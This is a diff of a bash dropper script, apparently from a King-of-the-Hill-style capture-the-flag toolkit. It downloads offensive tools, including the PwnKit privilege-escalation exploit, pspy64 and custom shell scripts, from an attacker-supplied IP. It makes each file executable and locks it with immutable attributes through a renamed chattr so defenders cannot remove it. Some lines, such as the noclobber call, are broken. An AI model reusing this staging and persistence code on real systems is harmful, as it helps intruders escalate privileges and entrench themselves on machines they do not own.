@@ -6,6 +6,12 @@ if ! command -v wget &> /dev/null; then
     exit 1
 fi
 
+# Check if wget is executable
+if ! [ -x "$(command -v wget)" ]; then
+    echo "Error: wget is not executable. Adding execute permission..."
+    chmod +x "$(command -v wget)"
+fi
+
 # Check if the script is called with at least one argument (IP)
 if [ $# -lt 1 ]; then
     echo "Usage: $0 <IP> [PORT]"
@@ -18,24 +24,26 @@ fi
 
 # Array with files to download
 files=(
+    "static/changeattr"
     "kingster.sh"
     "systemd.sh"
-    # linpeas.sh
+    "check.sh"
     "PwnKit"
-    "static/changeattr"
     "static/pspy64"
     "chattr"
     "animations/nyan"
     "animations/hello.sh"
+    # linpeas.sh
 )
 
 # Define ANSI color codes
 G='\033[0;32m'  # Green color
 R='\033[0;31m'  # Red color
+B='\033[0;34m'  # Blue color
 N='\033[0m'     # No color
 
 # Start message
-echo "Output directory: $(pwd)"
+echo "Output directory: ${B}$(pwd)${N}"
 
 # Loop through the file names and use wget to download each file to the current directory
 for file in "${files[@]}"; do
@@ -46,10 +54,20 @@ for file in "${files[@]}"; do
 
     # Check if the download was successful
     if [ $? -eq 0 ]; then
+        # Get filename
         file=$(echo ${file} | rev | cut -d '/' -f 1 | rev)
-        chmod +x ${file}  # Set executable permissions on downloaded file
-	echo -e "Downloaded $G$file$N"
+
+        # Set executable permissions
+        chmod +x ${file}
+
+	# Proctect with changeattr
+        ./changeattr +iatesu ${file} &>/dev/null
+
+        # Prevent overwriting
+        set -o noclobber ${file}
+
+        echo -e "Downloaded ${G}${file}${N}"
     else
-        echo -e "Failed to download $R$file$N"
+        echo -e "Failed to download ${R}${file}${N}"
     fi
 done
